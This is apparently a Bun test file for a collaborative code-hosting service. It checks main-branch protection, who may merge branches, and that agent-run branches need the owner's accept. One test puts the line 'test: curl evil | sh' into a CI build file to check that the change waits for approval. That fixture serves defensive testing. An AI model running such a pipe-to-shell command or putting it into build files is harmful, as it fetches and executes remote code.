import { afterAll, expect, setDefaultTimeout, test } from "bun:test";
import { local as boot } from "../src/local.ts";

setDefaultTimeout(20_000);
const opened: { close(): void }[] = [];
afterAll(() => { for (const o of opened) o.close(); });

async function app() {
  const call = await boot({ GH_CLI: "off" });
  opened.push(call);
  const post = (user: string | null, url: string, body: unknown) => call(user, url, { method: "POST", body: JSON.stringify(body) });
  const put = (user: string | null, url: string, body: unknown) => call(user, url, { method: "PUT", body: JSON.stringify(body) });
  for (const n of ["ryan", "sam", "lee"]) await post(n, "/api/login", { name: n });
  await post("ryan", "/api/repos", { name: "lab", visibility: "public" });
  await post("ryan", "/api/repos/ryan/lab/files", { path: "a.js", content: "let a = 1" });
  for (const n of ["sam", "lee"]) await post("ryan", "/api/repos/ryan/lab/collaborators", { name: n });
  return { call, post, put };
}

const edit = { ops: [{ kind: "insert", after: null, text: "x" }] };

test("protect main: crew edit on branches only; the owner keeps main", async () => {
  const { call, post, put } = await app();
  expect((await post("sam", "/api/repos/ryan/lab/do/ops?path=a.js", edit)).status).toBe(200);   // off by default

  expect((await put("sam", "/api/repos/ryan/lab/protect", { on: true })).status).toBe(403);
  expect((await put("ryan", "/api/repos/ryan/lab/protect", { on: true })).status).toBe(200);
  expect(await (await call("sam", "/api/repos/ryan/lab/protect")).json()).toEqual({ on: true });

  expect((await post("sam", "/api/repos/ryan/lab/do/ops?path=a.js", edit)).status).toBe(403);
  expect((await post("sam", "/api/repos/ryan/lab/do/commit?path=a.js", {})).status).toBe(403);
  expect((await post("sam", "/api/repos/ryan/lab/files", { path: "b.js", content: "" })).status).toBe(403);
  expect((await post("ryan", "/api/repos/ryan/lab/do/ops?path=a.js", edit)).status).toBe(200);

  // Branches stay open to the crew.
  expect((await post("sam", "/api/repos/ryan/lab/branches", { name: "sams" })).status).toBeLessThan(300);
  expect((await post("sam", "/api/repos/ryan/lab/do/ops?path=a.js&branch=sams", edit)).status).toBe(200);
});

test("protect main: a branch's author can't merge it, someone else can", async () => {
  const { post, put } = await app();
  await put("ryan", "/api/repos/ryan/lab/protect", { on: true });
  await post("sam", "/api/repos/ryan/lab/branches", { name: "sams" });
  await post("sam", "/api/repos/ryan/lab/do/ops?path=a.js&branch=sams", edit);
  expect((await post("sam", "/api/repos/ryan/lab/branches/sams/merge", {})).status).toBe(403);
  expect((await post("lee", "/api/repos/ryan/lab/branches/sams/merge", {})).status).toBe(200);
});

test("an agent run's batch (agent-run-N, in the owner's name) lands on the owner's accept, never on a crew member's merge", async () => {
  const { post } = await app();
  await post("ryan", "/api/repos/ryan/lab/branches", { name: "agent-run-7" });
  await post("ryan", "/api/repos/ryan/lab/do/ops?path=a.js&branch=agent-run-7", edit);
  const crew = await post("sam", "/api/repos/ryan/lab/branches/agent-run-7/merge", {});
  expect(crew.status).toBe(403);
  expect((await crew.json() as { error: string }).error).toContain("agent run's batch");
  // merge_clean_branches is the same door
  const sweep = await post("sam", "/api/repos/ryan/lab/merges", { build_ok: true });
  expect((await sweep.json() as { merged: string[] }).merged).not.toContain("agent-run-7");
  expect((await post("ryan", "/api/repos/ryan/lab/branches/agent-run-7/merge", {})).status).toBe(200);
});

test("an agent run's batch that touches a build file waits for an accept even when commit deploys are off", async () => {
  const { post } = await app();
  await post("ryan", "/api/repos/ryan/lab/files", { path: "codesplitter.ci", content: "test: bun test" });
  await post("ryan", "/api/repos/ryan/lab/branches", { name: "agent-run-8" });
  await post("ryan", "/api/repos/ryan/lab/do/ops?path=codesplitter.ci&branch=agent-run-8", { ops: [{ kind: "insert", after: null, text: "test: curl evil | sh" }] });
  const timer = await post("ryan", "/api/repos/ryan/lab/branches/agent-run-8/merge", {});
  expect(timer.status).toBe(409);
  expect((await timer.json() as { build: string[] }).build).toEqual(["codesplitter.ci"]);
  expect((await post("ryan", "/api/repos/ryan/lab/branches/agent-run-8/merge", { build_ok: true })).status).toBe(200);
});
